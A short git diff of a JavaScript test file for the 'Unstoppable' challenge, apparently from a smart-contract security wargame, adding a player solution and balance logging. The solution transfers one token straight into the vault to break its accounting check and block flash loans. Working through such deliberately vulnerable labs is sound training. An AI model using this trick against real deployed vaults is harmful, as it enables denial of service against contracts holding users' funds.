@@ -41,11 +41,14 @@ describe("[Challenge] Unstoppable", function () {
     await receiverContract.executeFlashLoan(100n * 10n ** 18n);
   });
 
+  /** CODE YOUR SOLUTION INSIDE HERE */
   it("Execution", async function () {
-    /** CODE YOUR SOLUTION HERE */
+    console.log("VAULT BALANCE BEFORE", String(await token.balanceOf(vault.address)));
+
     // Transfer 1 token to LenderPool to create an internal imbalance and make the assert
-    console.log("  POOL BALANCE", String(await token.balanceOf(vault.address)));
     await token.connect(player).transfer(vault.address, 1);
+
+    console.log("VAULT BALANCE AFTER", String(await token.balanceOf(vault.address)));
   });
 
   after(async function () {
